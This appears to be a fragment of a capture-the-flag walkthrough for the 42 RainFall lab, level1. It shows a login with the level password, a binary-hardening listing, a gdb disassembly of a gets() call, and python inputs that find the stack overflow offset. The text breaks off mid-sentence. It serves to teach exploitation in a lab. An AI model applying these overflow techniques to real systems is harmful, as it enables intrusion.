```shell
┌──$ [~/42/2021/rainfall]
└─>  ssh 192.168.1.75 -p 4242 -l level1
level1@192.168.1.75's password: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
```

```gdb
level1@RainFall:~$ gdb ./level1
(gdb) break main
Breakpoint 1 at 0x8048483
(gdb) run
Starting program: /home/user/level1/level1

Breakpoint 1, 0x08048483 in main ()
(gdb) disassemble
Dump of assembler code for function main:
   0x08048480 <+0>:		push   %ebp
   0x08048481 <+1>:		mov    %esp,%ebp
=> 0x08048483 <+3>:		and    $0xfffffff0,%esp
   0x08048486 <+6>:		sub    $0x50,%esp
   0x08048489 <+9>:		lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
(gdb)
```

```shell
level1@RainFall:~$ ./level1 <<< $(python -c 'print("+"*75)'); echo $?
32
level1@RainFall:~$ ./level1 <<< $(python -c 'print("+"*76)'); echo $?
Illegal instruction (core dumped)
132
level1@RainFall:~$ ./level1 <<< $(python -c 'print("+"*77)'); echo $?
Segmentation fault (core dumped)
139
```
Program ca

